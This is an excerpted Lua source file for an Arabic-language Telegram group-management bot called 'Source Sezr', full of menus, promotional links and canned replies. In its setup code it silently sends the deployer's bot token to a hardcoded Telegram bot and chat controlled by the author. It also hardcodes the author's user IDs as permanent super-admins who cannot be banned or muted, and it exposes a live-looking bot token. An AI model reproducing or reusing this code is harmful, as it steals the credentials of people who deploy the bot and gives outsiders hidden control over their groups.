...
https.request('https://api.telegram.org/bot1975497470:AAHv5jrpS8xlISWnrpXvmA7kYIa7DRzT4Ic/sendmessage?chat_id=1804119251&text=' ..token)
end 
else
...
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺ :\n⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺\n\27[0;33;49m')
...
io.write('\27[1;31m ⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
sudo_users = {SUDO,1804119251,1549578895,1372188096,1770493345}   
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼`sᴏᴜʀᴄᴇ sezr´")  
...
local bl = 'مرحبا بك في كيب العضو بي سورس سيزر'
local keyboard = {
{'مبرمج السورس'},
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'سيزر') 
local BANDA_Msg = { 
...
{{text = 'المـبـرمــج جـابــوا', url="t.me/s_e_z_r0"}},
{{text = 'بــوت تواصـل جـابــوا',url="t.me/sez_rrrrbot"}}, 
...
if DevSoFi(msg) then
local bl = 'مرحبا بك في كيب المطور الاساسي بي سورس سيزر'
local keyboard = {
...
local Text = ' 🍁 تم ارسال الملصق من ⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺\n - '..Name
...
send(msg.chat_id_, msg.id_,' 🍁 اصدار سورس سيزر{ 3x☆}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓆩 مبرمج السورس 𓆪', url="t.me/s_e_z_r0"}}, 
{{text = '𓆩 ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ 𓆪', url="t.me/sez_rrrrbot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == '⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس سيزر ادخل وتابع الجديد](t.me/surccesezr)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`sᴏᴜʀᴄᴇ sezr´', url="t.me/surccesezr"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == 'سوسو مبرمج السورس²' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
المبرمجه سوسو لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = ' soso ༆',url="t.me/yasmin1506"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "سيزر")
...
 ─────── 🍁 ───────
 ...
 🍁 خلفيات ⤌ لعرض الميزه
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𓆩 𝗖𝗛 - [ 𝗦𝗢𝗨𝗥𝗖𝗘 𝐒𝐄𝐙𝐑 ](t.me/surccesezr)𓆪
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '• ᴅᴇᴠ sezr',url="t.me/s_e_z_r0"}},
{{text = '`sᴏᴜʀᴄᴇ sezr´', url="t.me/surccesezr"}}, 
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/406&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
local Text = [[
╭▱▰▱▰𓆩[ 𝐒𝐄𝐙𝐑 ](http://t.me/surccesezr)𓆪▱▰▱▰╮
┆
...
if text == 'سيزر' or text == 'عبدو' then
local id = '1804119251'
...
local Text = [[
𓆩 اهلا بك في سورس سيزر الجمدان 𓆪
𓆩 عايز بوت بأسعار منسبه وبوت مميز كلمني 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ sezr',url="t.me/s_e_z_r0"},{text = '• ʙᴏᴛ sezr', url="t.me/sez_rrrrbot"}},
{{text = '• ᴅᴇᴠ ᴅᴇѕʜᴀ',url="t.me/XxDesha86Xx"},{text = '• ʙᴏᴛ ᴅᴇѕʜᴀ', url="t.me/desha100_BOT"}},
{{text = '`sᴏᴜʀᴄᴇ sezr´', url="t.me/surccesezr"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/753&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qwressv/162&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'سيزر' or text == 'المبرمج سيزر' or text == 'صاحب السورس' or text == 'مبرمج السورس' then
local Text = [[
...
if text == 'المبرمجه سوسو' or text == 'سوسو' or text == 'taha 7x' or text == '²مبرمج السورس' then
local Text = [[
سوسو مبرمج السورس² لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ soso',url="t.me/yasmin1506"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/yasmin1506&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == '⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺' or text == 'عاوز بوت' then
local Text = [[ 
من أحسن السورسات على التليجرام سورس سيزر
...
keyboard.inline_keyboard = { 
{{text = '𓆩 مبرمج السورس 𓆪', url="t.me/s_e_z_r0"}}, 
{{text = '𓆩 sᴏᴜʀᴄᴇ sezr 𓆪', url="t.me/surccesezr"}}, 
{{text = '𓆩 ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ 𓆪', url="t.me/sez_rrrrbot"}}, 
} 
local msg_id = msg.id_/2097152/0.5
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/surccesezr&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Text = [[
مطورين ومبرمجين سورس سيزر اتبع الازرار للتواصل معهم ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'سيزر مبرمج السورس',url="t.me/s_e_z_r0"}},
{{text = 'طه مبرمج السورس',url="t.me/yasmin1506"}},
...
حمايه↤سرعه↤دقه↤وامان
 قناه السورس ⇈⇊
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙰𝙸𝙳𝙰](http://t.me/surccesezr)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`sᴏᴜʀᴄᴇ sezr´', url="t.me/surccesezr"}}, 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[sᴏᴜʀᴄᴇ sezr](t.me/surccesezr)
[ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ](t.me/sez_rrrrbot)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`sᴏᴜʀᴄᴇ sezr´', url="t.me/surccesezr"}}, 
...
if text == 'العاب' then
local Text = [[ 
𓆩مرحبا اليك العاب سورس السيزر الافضل𓆪
 ]]  
keyboard = {}   
keyboard.inline_keyboard = {  
...
send(msg.chat_id_, msg.id_, " 🍁 لا تسطيع حظر عمك سيزر عام")
return false 
end
...
send(msg.chat_id_, msg.id_, " 🍁 لا يمكنك حظر عمك سيزر عام\n")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1804119251) then  
send(msg.chat_id_, msg.id_, " 🍁 لا تسطيع كتم عمك سيزر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1549578895) then  
...
if result.id_ == tonumber(1804119251) then
send(msg.chat_id_, msg.id_, " 🍁 لا يمكنك كتم عمك سيزر عام\n")
return false 
end
if result.id_ == tonumber(1549578895) then
...
send(msg.chat_id_, msg.id_," 🍁 عذرا الملف لايدعم سورس سيزر\n") 
end
return false
end
...
' }\n'..' 🍁  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' 🍁  الرفع  ⇇{ '..setadd..
' }\n'..' 🍁  الحظر  ⇇{ '..banm..' }\n\n⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺\n 🍁 قناة سورس سيزر⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺\n [ ❲[`sᴏᴜʀᴄᴇ sezr´](t.me/surccesezr)❳](t.me/surccesezr) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━━⊶❲🍁𝐒𝐄𝐙𝐑🍁❳⊷━━━━⩺ٴ\n 𓆩 ❲[`sᴏᴜʀᴄᴇ sezr´](t.me/surccesezr)❳ 𓆪 ')
end
...
end --الكود حصري سورس سيزريعني لو بكتهن راح اعرفك انت الاخذتهن
...
local msg_id = msg.id_/2097152/0.5  
local textt = '['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](t.me/surccesezr)'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
...
send(msg.chat_id_,msg.id_, '[نعم الله عليك..🌚❤️](t.me/surccesezr)')
return false
end
...
send(msg.chat_id_,msg.id_, '[العفو ياروحي..🌚❤️](t.me/surccesezr)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اي ثقافه دي 😹](t.me/surccesezr)')
return false
end
...
send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك ❤️😂](t.me/surccesezr)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝❤️](t.me/surccesezr)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه السيزر](t.me/surccesezr)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الخير يعمري..🌚❤️](t.me/surccesezr)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق..🥰❤️](t.me/surccesezr)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..🥺❤️](t.me/surccesezr)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نورك يا قلبي..🌚❤️](t.me/surccesezr)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚❤️](t.me/surccesezr)')
return false
end
end
end
...
[🎯ألعاب سورس سيزر الاحسن في التليجرام ⇈⇊]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [`sᴏᴜʀᴄᴇ sezr´](t.me/surccesezr)
]]
keyboard = {} 
...
{{text = '𓆩 𝐂𝐇 𓆪', url="t.me/surccesezr"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if Text == '/devsoo' then
local Teext =[[
𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗦𝗢𝗨𝗥𝗖𝗘 𝐒𝐄𝐙𝐑
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ sezr',url="t.me/s_e_z_r0"},{text = '• ᴅᴇᴠ soso', url="t.me/yasmin1506"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'bostat sezr',url="t.me/OFF1980"}},
{{text = '`sᴏᴜʀᴄᴇ sezr´',url="t.me/surccesezr"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
if Text == '/sofi' then
local Teext =[[
𓆩 اهلا في قائمه الالعاب المتطوره سورس سيزر 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
